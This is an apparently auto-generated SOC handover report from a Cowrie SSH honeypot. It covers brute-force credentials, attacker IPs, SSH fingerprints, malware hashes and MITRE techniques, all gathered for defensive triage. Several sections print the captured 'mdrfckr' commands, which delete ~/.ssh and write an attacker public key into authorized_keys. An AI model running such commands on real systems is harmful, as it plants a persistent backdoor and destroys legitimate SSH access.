# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-10 |
| **Generated At** | 2026-05-10T19:11:27Z |
| **Shift Time** | 19:11 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **282** |
| Confirmed Threats | **160** |
| False Positives Filtered | **122** (43.3%) |
| Unique Attacker IPs | **28** |
| Countries of Origin | **18** |
| High Severity Cases | **6** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **276** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **81** |
| Unique Credential Pairs | **77** |
| Unique Usernames | **42** |
| Unique Passwords | **72** |
| Successful Auth Pairs | **5** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `ubuntu` | 13 |
| `root` | 6 |
| `admin` | 5 |
| `test` | 5 |
| `ftpuser` | 3 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123456` | 4 |
| `345gs5662d34` | 3 |
| `3245gs5662d34` | 3 |
| `Password123` | 2 |
| `test123` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 3 |
| `root` | `3245gs5662d34` | 3 |
| `admin` | `wang123` | 1 |
| `hadoop` | `1234567` | 1 |
| `ftpuser` | `ftpuser123123` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `bitnami` | `194.113.237.239` | 2026-05-10T17:27:41 |
| `root` | `3245gs5662d34` | `194.113.237.239` | 2026-05-10T17:27:46 |
| `root` | `admin@789` | `194.113.237.239` | 2026-05-10T17:44:09 |
| `root` | `Password88` | `89.144.211.139` | 2026-05-10T18:54:07 |
| `root` | `3245gs5662d34` | `89.144.211.139` | 2026-05-10T18:54:11 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **282** |
| Sessions with Fingerprint | **4** |
| Unique HASSH Fingerprints | **4** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 116 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `af8223ac9914...` | libssh-based | 78 | 4 |
| `03a80b21afa8...` | Modern SSH client | 23 | 2 |
| `8c95e28f1643...` | Mirai/variant | 14 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `af8223ac9914...` | libssh | 78 | 4 | libssh-based |
| `03a80b21afa8...` | libssh | 23 | 2 | Modern SSH client |
| `8c95e28f1643...` | libssh | 14 | 1 | Mirai/variant |
| `95420f9d932d...` | libssh | 1 | 1 | — |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 3 | 2 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `89.144.211.139`, `194.113.237.239`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **28** |
| Unique ASNs | **25** |
| High-Risk ASNs | **12** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS8048` | CANTV Servicios, Venezuela | 2 | HIGH |
| `AS36903` | Office National des Postes et Telecommunications ONPT (Maroc Telecom) / IAM | 2 | LOW |
| `AS209334` | Modat B.V. | 2 | HIGH |
| `AS60490` | MTS PJSC | 1 | HIGH |
| `AS35819` | Etihad Etisalat, a joint stock company | 1 | HIGH |
| `AS6568` | EMPRESA NACIONAL DE TELECOMUNICACIONES SOCIEDAD ANONIMA | 1 | LOW |
| `AS273173` | TELECOM 3 C.A | 1 | LOW |
| `AS8075` | Microsoft Corporation | 1 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (6)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-bc67168d0cce

| Field | Detail |
|---|---|
| **Source IP** | `194.113.237[.]239` |
| **First Seen** | 2026-05-10 17:27 |
| **Last Seen** | 2026-05-10 17:27 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 17:27:41` | `cowrie.session.connect` |
| `2026-05-10 17:27:41` | `cowrie.client.version` |
| `2026-05-10 17:27:41` | `cowrie.client.kex` |
| `2026-05-10 17:27:41` | `cowrie.login.success` |
| `2026-05-10 17:27:42` | `cowrie.session.params` |
| `2026-05-10 17:27:42` | `cowrie.command.input` |
| `2026-05-10 17:27:42` | `cowrie.command.failed` |
| `2026-05-10 17:27:42` | `cowrie.log.closed` |
| `2026-05-10 17:27:42` | `cowrie.session.params` |
| `2026-05-10 17:27:42` | `cowrie.command.input` |
| `2026-05-10 17:27:43` | `cowrie.session.file_download` |
| `2026-05-10 17:27:43` | `cowrie.log.closed` |
| `2026-05-10 17:27:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `194.113.237[.]239` to AbuseIPDB if not already reported
- [ ] Block `194.113.237[.]239` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3cc4fba8d3a6

| Field | Detail |
|---|---|
| **Source IP** | `194.113.237[.]239` |
| **First Seen** | 2026-05-10 17:27 |
| **Last Seen** | 2026-05-10 17:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 17:27:45` | `cowrie.session.connect` |
| `2026-05-10 17:27:45` | `cowrie.client.version` |
| `2026-05-10 17:27:45` | `cowrie.client.kex` |
| `2026-05-10 17:27:46` | `cowrie.login.success` |
| `2026-05-10 17:27:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `194.113.237[.]239` to AbuseIPDB if not already reported
- [ ] Block `194.113.237[.]239` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-083085a5f2b6

| Field | Detail |
|---|---|
| **Source IP** | `194.113.237[.]239` |
| **First Seen** | 2026-05-10 17:44 |
| **Last Seen** | 2026-05-10 17:44 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 17:44:08` | `cowrie.session.connect` |
| `2026-05-10 17:44:08` | `cowrie.client.version` |
| `2026-05-10 17:44:08` | `cowrie.client.kex` |
| `2026-05-10 17:44:09` | `cowrie.login.success` |
| `2026-05-10 17:44:09` | `cowrie.session.params` |
| `2026-05-10 17:44:09` | `cowrie.command.input` |
| `2026-05-10 17:44:09` | `cowrie.command.failed` |
| `2026-05-10 17:44:09` | `cowrie.log.closed` |
| `2026-05-10 17:44:10` | `cowrie.session.params` |
| `2026-05-10 17:44:10` | `cowrie.command.input` |
| `2026-05-10 17:44:10` | `cowrie.session.file_download` |
| `2026-05-10 17:44:10` | `cowrie.log.closed` |
| `2026-05-10 17:44:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `194.113.237[.]239` to AbuseIPDB if not already reported
- [ ] Block `194.113.237[.]239` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb246db3d61a

| Field | Detail |
|---|---|
| **Source IP** | `194.113.237[.]239` |
| **First Seen** | 2026-05-10 17:44 |
| **Last Seen** | 2026-05-10 17:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 17:44:13` | `cowrie.session.connect` |
| `2026-05-10 17:44:13` | `cowrie.client.version` |
| `2026-05-10 17:44:13` | `cowrie.client.kex` |
| `2026-05-10 17:44:13` | `cowrie.login.success` |
| `2026-05-10 17:44:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `194.113.237[.]239` to AbuseIPDB if not already reported
- [ ] Block `194.113.237[.]239` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab2ca5c034d1

| Field | Detail |
|---|---|
| **Source IP** | `89.144.211[.]139` |
| **First Seen** | 2026-05-10 18:54 |
| **Last Seen** | 2026-05-10 18:54 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 18:54:06` | `cowrie.session.connect` |
| `2026-05-10 18:54:06` | `cowrie.client.version` |
| `2026-05-10 18:54:06` | `cowrie.client.kex` |
| `2026-05-10 18:54:07` | `cowrie.login.success` |
| `2026-05-10 18:54:07` | `cowrie.session.params` |
| `2026-05-10 18:54:07` | `cowrie.command.input` |
| `2026-05-10 18:54:07` | `cowrie.command.failed` |
| `2026-05-10 18:54:08` | `cowrie.log.closed` |
| `2026-05-10 18:54:08` | `cowrie.session.params` |
| `2026-05-10 18:54:08` | `cowrie.command.input` |
| `2026-05-10 18:54:08` | `cowrie.session.file_download` |
| `2026-05-10 18:54:08` | `cowrie.log.closed` |
| `2026-05-10 18:54:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `89.144.211[.]139` to AbuseIPDB if not already reported
- [ ] Block `89.144.211[.]139` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4b4a3448702

| Field | Detail |
|---|---|
| **Source IP** | `89.144.211[.]139` |
| **First Seen** | 2026-05-10 18:54 |
| **Last Seen** | 2026-05-10 18:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 18:54:11` | `cowrie.session.connect` |
| `2026-05-10 18:54:11` | `cowrie.client.version` |
| `2026-05-10 18:54:11` | `cowrie.client.kex` |
| `2026-05-10 18:54:11` | `cowrie.login.success` |
| `2026-05-10 18:54:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `89.144.211[.]139` to AbuseIPDB if not already reported
- [ ] Block `89.144.211[.]139` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `148.66.133[.]193` | **37** | 2026-05-10 17:55 | 2026-05-10 18:32 | 18m | 0 | `T1592` | 🟠 MEDIUM |
| `194.113.237[.]239` | **30** | 2026-05-10 17:19 | 2026-05-10 17:46 | 1m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `117.50.70[.]125` | **24** | 2026-05-10 17:00 | 2026-05-10 17:22 | 44m | 0 | `T1592` | 🟠 MEDIUM |
| `201.249.205[.]94` | **21** | 2026-05-10 17:18 | 2026-05-10 19:08 | 0m | 21 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `187.51.208[.]158` | **20** | 2026-05-10 18:19 | 2026-05-10 19:10 | 1m | 20 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `36.134.147[.]79` | **15** | 2026-05-10 17:29 | 2026-05-10 17:52 | 22m | 3 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `118.122.147[.]195` | 1 | 2026-05-10 18:14 | 2026-05-10 18:16 | 120s | 0 | `T1592` | 🟢 LOW |
| `150.95.25[.]34` | 1 | 2026-05-10 18:24 | 2026-05-10 18:24 | 37s | 0 | `T1592` | 🟢 LOW |
| `212.73.148[.]20` | 1 | 2026-05-10 18:09 | 2026-05-10 18:10 | 29s | 0 | `T1592` | 🟢 LOW |
| `78.171.171[.]245` | 1 | 2026-05-10 18:23 | 2026-05-10 18:23 | 14s | 0 | `T1592` | 🟢 LOW |
| `85.217.140[.]8` | 1 | 2026-05-10 18:16 | 2026-05-10 18:16 | 29s | 0 | `T1592` | 🟢 LOW |
| `86.51.14[.]227` | 1 | 2026-05-10 17:16 | 2026-05-10 17:16 | 3s | 0 | `T1592` | 🟢 LOW |
| `89.144.211[.]139` | 1 | 2026-05-10 18:54 | 2026-05-10 18:54 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 41/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `78.171.171[.]245` | TR | Turk Telekomunikasyon Anonim Sirketi | **100** ⚠️ | 2 |
| `89.144.211[.]139` | AT | A1 Telekom Austria AG | **100** ⚠️ | 4 |
| `117.50.70[.]125` | CN | Shanghai UCloud Information Technology Company Limited | **100** ⚠️ | 50 |
| `194.113.237[.]239` | RU | MTS PJSC | **100** ⚠️ | 2 |
| `86.51.14[.]227` | SA | Etihad Etisalat, a joint stock company | **100** ⚠️ | 2 |
| `212.73.148[.]20` | SG | NL MODAT | **100** ⚠️ | 50 |
| `148.66.133[.]193` | SG | Godaddy.com | **100** ⚠️ | 2 |
| `85.217.140[.]8` | FR | NL MODAT | **100** ⚠️ | 50 |
| `150.95.25[.]34` | TH | ZCOM THAI | **100** ⚠️ | 0 |
| `187.51.208[.]158` | BR | TELEFÔNICA BRASIL S.A | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 116 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 75 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 6 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 3 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 3 |

---

## 🔕 False Positive Summary (122 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 28 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| AbuseIPDB score 19 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 91 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 282 cases |
| Tool 34  | Credential Extractor        | ✅ 81 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 4 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 28 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 122 filtered (43.3%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 25 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 6 priority case(s) shown individually · 13 recon entry/entries in table (6 group(s) consolidating 147 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-10T19:11:27Z_
